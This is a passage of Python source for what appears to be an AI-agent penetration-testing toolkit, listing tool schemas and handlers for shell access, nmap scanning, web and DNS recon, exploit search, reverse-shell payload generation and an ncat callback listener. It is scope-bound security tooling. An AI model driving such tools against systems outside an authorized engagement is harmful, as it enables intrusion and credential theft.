                full = base + ("" if p.startswith("/") else "/") + p
                try:
                    r = cli.get(full, timeout=timeout)
                except Exception:  # noqa: BLE001
                    continue
                if r.status_code != 404:
                    hits.append(f"{p} -> {r.status_code} ({len(r.content)}b)")
    except Exception as exc:  # noqa: BLE001
        return f"web_dirs: {exc}"

    ctx.session["actions"].append(
        {"tool": "web_dirs", "url": base, "probed": len(paths), "hits": len(hits), "ts": _ts()})
    return clip(f"{len(hits)} non-404 responses out of {len(paths)} paths under {base}:\n" + "\n".join(hits))


# --------------------------------------------------------------------------
# registry
# --------------------------------------------------------------------------

def _schema(name: str, description: str, properties: dict, required: list[str]) -> dict:
    return {
        "type": "function",
        "function": {
            "name": name,
            "description": description,
            "parameters": {"type": "object", "properties": properties, "required": required},
        },
    }


TOOLS: list[dict] = [
    _schema("shell", "Run a shell command on the operator host (cwd = session workdir). "
                     "Use when no dedicated tool fits. Returns stdout+stderr and exit code.",
            {"command": {"type": "string", "description": "shell command to execute"},
             "timeout": {"type": "integer", "description": "seconds before kill (default 90)"}},
            ["command"]),
    _schema("nmap_scan", "Port/service scan with nmap. Profiles: quick (-F), top100, full (-p-), "
                         "service (-sV -sC), vuln (--script=vuln), stealth, udp.",
            {"target": {"type": "string", "description": "host, IP range or CIDR (must be in scope)"},
             "profile": {"type": "string", "description": "quick|top100|full|service|vuln|stealth|udp"},
             "ports": {"type": "string", "description": "explicit port spec, e.g. 80,443 or 1-1000"},
             "extra": {"type": "string", "description": "additional raw nmap flags"},
             "timeout": {"type": "integer"}},
            ["target"]),
    _schema("http_probe", "Fetch a URL and report status, headers, title and size. Non-destructive.",
            {"url": {"type": "string"},
             "method": {"type": "string", "description": "GET, POST, HEAD, PUT, DELETE, OPTIONS"},
             "follow": {"type": "boolean"},
             "timeout": {"type": "number"}},
            ["url"]),
    _schema("web_vuln_scan", "Passive/semi-active web checks: security headers, allowed methods, CORS "
                             "reflection, common sensitive paths, tech fingerprint.",
            {"url": {"type": "string"},
             "checks": {"type": "string", "description": "headers,methods,paths,cors,tech"},
             "timeout": {"type": "number"}},
            ["url"]),
    _schema("dns_recon", "DNS enumeration (A/AAAA/CNAME/MX/NS/TXT/SOA) plus whois if available.",
            {"domain": {"type": "string"},
             "types": {"type": "string", "description": "comma separated record types"}},
            ["domain"]),
    _schema("subdomain_enum", "Enumerate subdomains via crt.sh and HackerTarget.",
            {"domain": {"type": "string"},
             "source": {"type": "string", "description": "crtsh|hackertarget|all"}},
            ["domain"]),
    _schema("cve_lookup", "Look up a CVE by id or search the CVE database by keyword.",
            {"query": {"type": "string"}}, ["query"]),
    _schema("exploit_search", "Search local exploit DB (searchsploit if installed) and CVE references "
                              "for exploit material.",
            {"query": {"type": "string"}}, ["query"]),
    _schema("payload_gen", "Generate a labeled payload for a listener. Types: bash, nc, nc-e, socat, awk, "
                             "python, python-pty, php, powershell, download, download-wget.",
            {"type": {"type": "string"},
             "lhost": {"type": "string"},
             "lport": {"type": "string"},
             "base64": {"type": "boolean"},
             "output": {"type": "string", "description": "optional file path to save the payload"}},
            ["type", "lhost", "lport"]),
    _schema("listener", "Start/stop a local ncat listener for reverse-shell callbacks.",
            {"action": {"type": "string", "description": "start|stop"},
             "lport": {"type": "integer"},
             "proto": {"type": "string", "description": "tcp|exec"}},
            ["action"]),
    _schema("note", "Record an engagement finding, credential, target or todo. Evidence optional.",
            {"text": {"type": "string"},
             "category": {"type": "string", "description": "finding|credential|target|todo"},
             "evidence": {"type": "string"},
             "host": {"type": "string"}},
            ["text"]),
    _schema("scope", "Manage the authorized engagement scope (list|add|remove|check).",
            {"action": {"type": "string"},
             "target": {"type": "string"},
             "note": {"type": "string"}},
            ["action"]),
    _schema("file_write", "Write an artifact (exploit script, wordlist, patch) to disk.",
            {"path": {"type": "string"},
             "content": {"type": "string"}},
            ["path", "content"]),
    _schema("report", "Show or save the engagement report (markdown).",
            {"action": {"type": "string", "description": "show|save|export"},
             "path": {"type": "string"}},
            ["action"]),
    _schema("encode", "Encode or decode data. Codecs: base64, hex, url, rot13, jwt (decode only).",
            {"input": {"type": "string"},
             "op": {"type": "string", "description": "encode|decode"},
             "codec": {"type": "string", "description": "base64|hex|url|rot13|jwt"}},
            ["input"]),
    _schema("hash_info", "Identify a password hash format from its structure (MD5, NTLM, SHA1/256/512, "
                        "bcrypt, Linux crypt, phpass, MySQL).",
            {"hash": {"type": "string"}}, ["hash"]),
    _schema("ip_info", "Look up IP/CIDR ownership, ASN and geolocation (ipinfo.io). Scope-bound.",
            {"target": {"type": "string", "description": "IP, CIDR or host"}}, ["target"]),
    _schema("tls_cert", "Fetch and parse the TLS certificate for host:port with openssl. Scope-bound.",
            {"target": {"type": "string"},
             "port": {"type": "integer"},
             "timeout": {"type": "integer"}},
            ["target"]),
    _schema("web_dirs", "Probe common directories/files (or a supplied wordlist) on a web server. "
                        "Scope-bound, non-destructive.",
            {"url": {"type": "string"},
             "wordlist": {"type": "string", "description": "optional wordlist path"},
             "limit": {"type": "integer", "description": "max paths to probe (default 60)"},
             "timeout": {"type": "number"}},
            ["url"]),
]

HANDLERS = {
    "shell": h_shell,
    "nmap_scan": h_nmap,
    "http_probe": h_http_probe,
    "web_vuln_scan": h_web_vuln_scan,
    "dns_recon": h_dns_recon,
    "subdomain_enum": h_subdomain_enum,
    "cve_lookup": h_cve_lookup,
    "exploit_search": h_exploit_search,
    "payload_gen": h_payload_gen,
    "listener": h_listener,
    "note": h_note,
    "scope": h_scope,
    "file_write": h_file_write,
    "report": h_report,
    "encode": h_encode,
    "hash_info": h_hash_info,
    "ip_info": h_ip_info,
    "tls_cert": h_tls_cert,
    "web_dirs": h_web_dirs,
}
